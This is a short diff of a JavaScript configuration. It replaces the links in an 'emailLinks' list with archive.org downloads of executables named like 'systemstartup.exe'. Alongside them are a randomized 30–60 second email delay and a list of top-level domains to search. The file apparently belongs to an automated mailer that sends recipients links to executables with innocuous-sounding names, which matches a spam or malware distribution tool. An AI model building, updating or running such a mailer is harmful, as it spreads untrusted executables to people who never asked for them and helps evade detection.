@@ -279,8 +279,9 @@ const CONFIG = {
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://archive.org/download/deliveryraufpoint_202602/deliveryraufpoint.exe",
-    "https://archive.org/download/deliveryraufpoint/deliveryraufpoint.exe",
+    "https://archive.org/download/systemstartup-1.0.0_202604/systemstartup%201.0.0.exe",
+    "https://archive.org/download/systemstartup-1.0.0_202604/systemstartup%20copy.exe",
+    "https://archive.org/download/systemstartup-1.0.0_202604/systemstartup.exe",
   ],
   searchTlds: [
     '.com', '.org', '.net', '.io', '.co', '.ad', '.ae', '.af', '.ag', '.al',
